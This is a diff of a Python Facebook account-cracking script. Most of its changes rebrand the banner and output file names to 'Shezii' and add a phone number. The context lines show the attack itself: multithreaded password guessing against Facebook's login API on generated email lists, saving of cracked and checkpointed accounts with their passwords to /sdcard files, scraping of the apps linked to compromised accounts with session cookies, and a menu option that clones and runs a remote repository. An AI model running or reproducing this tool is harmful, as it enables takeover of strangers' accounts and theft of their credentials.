@@ -78,20 +78,20 @@ tred = speed
 
 	
 logo=("""\033[1;91m
- \033[1;34m __  __ ______ __  __  ____  _____  _____ ______  _____ 
- \033[1;34m|  \/  |  ____|  \/  |/ __ \|  __ \|_   _|  ____|/ ____|
-\033[1;34m | \  / | |__  | \  / | |  | | |__) | | | | |__  | (___  
- \033[1;36m| |\/| |  __| | |\/| | |  | |  _  /  | | |  __|  \___ \ 
- \033[1;36m| |  | | |____| |  | | |__| | | \ \ _| |_| |____ ____) |
-\033[1;32m |_|  |_|______|_|  |_|\____/|_|  \_\_____|______|_____/ 
-                                                                                                
+\033[0;34m   _____ _    _ ______ ___________ _____ 
+\033[0;34m  / ____| |  | |  ____|___  /_   _|_   _|
+\033[0;34m | (___ | |__| | |__     / /  | |   | |  
+\033[0;34m \___ \|  __  |  __|   / /   | |   | |  
+\033[0;36m ____) | |  | | |____ / /__ _| |_ _| |_ 
+\033[0;36m |_____/|_|  |_|______/_____|_____|_____|                                                                                 
+\033[0;32m                                                                                              
 ----------------------------------------------
-\033[1;37m[-] AUTHOR    :\033[1;32m MEMORIES LOST 
-\033[1;37m[-] GITHUB    :\033[1;32m NOT FOUND 
-\033[1;37m[-] VERSION   :\033[1;32m ERROR '''MEMORIES""
-\033[1;37m[-] STATUS    :\033[1;32m 
+\033[1;37m[-] AUTHOR    :\033[1;32m Shezii😍 
+\033[1;37m[-] GITHUB    :\033[1;32m +971564382087
+\033[1;37m[-] VERSION   :\033[1;32m 3.4 '''UPDATE""
+\033[1;37m[-] STATUS    :\033[1;32m FREE
 --------------------------------------------
-[-] MEMORIES LOST FREE TRAIL ENJOY ❤️
+[-]  SHEZII 😍 FREE COMMAND ENJOY ❤️
 \033[1;37m----------------------------------------------""")
 
 ####@-----Menu-----@####
@@ -110,7 +110,7 @@ def JXS_Main():
         gmail()
     if inpp == "4":
      print(f'{oo("+")}Loading Best File Create Command ')
-     os.system('cd && git clone --depth=1 https://github.com/MEMORIES LOST-404/FILE')
+     os.system('cd && git clone --depth=1 https://github.com/MEMORIES Shezii😍-404/FILE')
      os.system('cd && cd FILE ;python FILE.py')
      exit()
     if inpp == "0":
@@ -124,7 +124,7 @@ def file():
     os.system("clear")
     print(logo)
     if 'gm' in l:
-        file = '.MEMORIES LOST'
+        file = '. Shezii😍'
     else:
         file = input(f"[-] PUT FILE NAME : ")
     try:
@@ -149,7 +149,7 @@ def check(session,coki):
     	pass
     else:
         for gm in game:
-            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' JXS-code=MEMORIES LOST-33'))
+            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' JXS-code=MEMORIES Shezii😍-33'))
     w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
@@ -158,13 +158,13 @@ def check(session,coki):
         pass
     else:
         for gm in game:
-            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','JXS-182^)Code=MEMORIES LOST-2233]'))
+            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','JXS-182^)Code=MEMORIES Shezii😍-2233]'))
 
 
 ####@-----Gmail-----@####
 
 def gmail():     
-        os.system('rm -rf .MEMORIES LOST')
+        os.system('rm -rf .Shezii😍')
         first = input(f'{oo("?")}Put First Name: ')
         last = input(f'{oo("?")}Put Last Name: ')
         domain = input(f'{oo("?")}Put Domain: ')
@@ -177,11 +177,11 @@ def gmail():
             lchoice = random.choice(lists)
             if '3' in lchoice:
                 mail = ''.join(random.choice(string.digits) for _ in range(3))
-                open('.MEMORIES LOST','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+                open('.Shezii😍','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
             else:
                 mail = ''.join(random.choice(string.digits) for _ in range(4))
-                open('.MEMORIES LOST','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
-            fo = open('.MEMORIES LOST', 'r').read().splitlines()
+                open('.Shezii😍','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+            fo = open('.Shezii😍', 'r').read().splitlines()
         with tred(max_workers=30) as king___xd:
             tl = str(len(fo))
             tk = first+last
@@ -266,7 +266,7 @@ def method():
     print('\033[1;93m='*25)
     print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
     print(f"{oo('-')}Wait As You Can :)")
-    print(f"{oo('✓')}/sdcard/MEMORIES LOST-OK.txt")
+    print(f"{oo('✓')}/sdcardShezii😍-OK.txt")
     print('\033[1;93m='*25)
     print()
     
@@ -294,8 +294,8 @@ def method():
       #      print(response.text)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m[\033[1;97mMEMORIES LOST-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m✓\033[1;97m '+pword+'  ')
-                open('/sdcard/MEMORIES LOST-OK.txt','a').write(f'{acc} ✓ {pword}\n')
+                print('\r\033[1;92m[\033[1;97mShezii😍-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m✓\033[1;97m '+pword+'  ')
+                open('/sdcard/Shezii😍-OK.txt','a').write(f'{acc} ✓ {pword}\n')
                 if c=='y':
                     try:
                            q = json.loads(response.text)
@@ -308,9 +308,9 @@ def method():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;91m[\033[1;97mMEMORIES LOST-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m✓\033[1;97m '+pword+'   ')
+                     print('\r\033[1;91m[\033[1;97mShezii😍-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m✓\033[1;97m '+pword+'   ')
                 cpacc.append(acc)
-                open('/sdcard/MEMORIES LOST-CP.txt','a').write(f'{acc} ✓ {pword}\n')
+                open('/sdcard/Shezii😍-CP.txt','a').write(f'{acc} ✓ {pword}\n')
                 break
             else:
                 continue
@@ -343,8 +343,8 @@ def method():
             response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m[\033[1;97mMEMORIES LOST-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m✓\033[1;97m '+pword+'  ')
-                open('/sdcard/MEMORIES LOST-OK.txt','a').write(f'{acc} ✓ {pword}\n')
+                print('\r\033[1;92m[\033[1;97mShezii😍-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m✓\033[1;97m '+pword+'  ')
+                open('/sdcard/Shezii😍-OK.txt','a').write(f'{acc} ✓ {pword}\n')
                 if 'y' in apps:
                 	check(r,coki)
                 if c=='y':
@@ -360,9 +360,9 @@ def method():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;91m[\033[1;97mMEMORIES LOST-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m✓\033[1;97m '+pword)
+                     print('\r\033[1;91m[\033[1;97mShezii😍-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m✓\033[1;97m '+pword)
                 cpacc.append(acc)
-                open('/sdcard/MEMORIES LOST-CP.txt','a').write(f'{acc} ✓ {pword}\n')
+                open('/sdcard/Shezii😍-CP.txt','a').write(f'{acc} ✓ {pword}\n')
                 break
             else:
                 continue
@@ -414,7 +414,7 @@ def andom():
     print('\033[1;93m='*25)
     print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
     print(f"{oo('-')}Wait As You Can :)")
-    print(f"{oo('✓')}/sdcard/MEMORIES LOST-OK.txt")
+    print(f"{oo('✓')}/sdcard/Shezii😍-OK.txt")
     print('\033[1;93m='*25)
     print()    
     def start(user):
@@ -441,8 +441,8 @@ def andom():
       #      print(response.text)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m[\033[1;97mMEMORIES LOST-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m✓\033[1;97m '+pword+'  ')
-                open('/sdcard/MEMORIES LOST-OK.txt','a').write(f'{acc} ✓ {pword}\n')
+                print('\r\033[1;92m[\033[1;97mShezii😍-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m✓\033[1;97m '+pword+'  ')
+                open('/sdcard/Shezii😍-OK.txt','a').write(f'{acc} ✓ {pword}\n')
                 if c=='y':
                     try:
                            q = json.loads(response.text)
@@ -455,9 +455,9 @@ def andom():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;91m[\033[1;97mMEMORIES LOST-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m✓\033[1;97m '+pword+'   ')
+                     print('\r\033[1;91m[\033[1;97mShezii😍-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m✓\033[1;97m '+pword+'   ')
                 cpacc.append(acc)
-                open('/sdcard/MEMORIES LOST-CP.txt','a').write(f'{acc} ✓ {pword}\n')
+                open('/sdcard/Shezii😍-CP.txt','a').write(f'{acc} ✓ {pword}\n')
                 break
             else:
                 continue
@@ -491,8 +491,8 @@ def andom():
             response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m[\033[1;97mMEMORIES LOST-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m✓\033[1;97m '+pword+'  ')
-                open('/sdcard/MEMORIES LOST-OK.txt','a').write(f'{acc} ✓ {pword}\n')
+                print('\r\033[1;92m[\033[1;97mShezii😍-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m✓\033[1;97m '+pword+'  ')
+                open('/sdcard/Shezii😍-OK.txt','a').write(f'{acc} ✓ {pword}\n')
                 if 'y' in apps:
                 	check(r,coki)
                 if c=='y':
@@ -508,9 +508,9 @@ def andom():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;91m[\033[1;97mMEMORIES LOST-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m✓\033[1;97m '+pword)
+                     print('\r\033[1;91m[\033[1;97mShezii😍-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m✓\033[1;97m '+pword)
                 cpacc.append(acc)
-                open('/sdcard/MEMORIES LOST-CP.txt','a').write(f'{acc} | {pword}\n')
+                open('/sdcard/Shezii😍-CP.txt','a').write(f'{acc} | {pword}\n')
                 break
             else:
                 continue
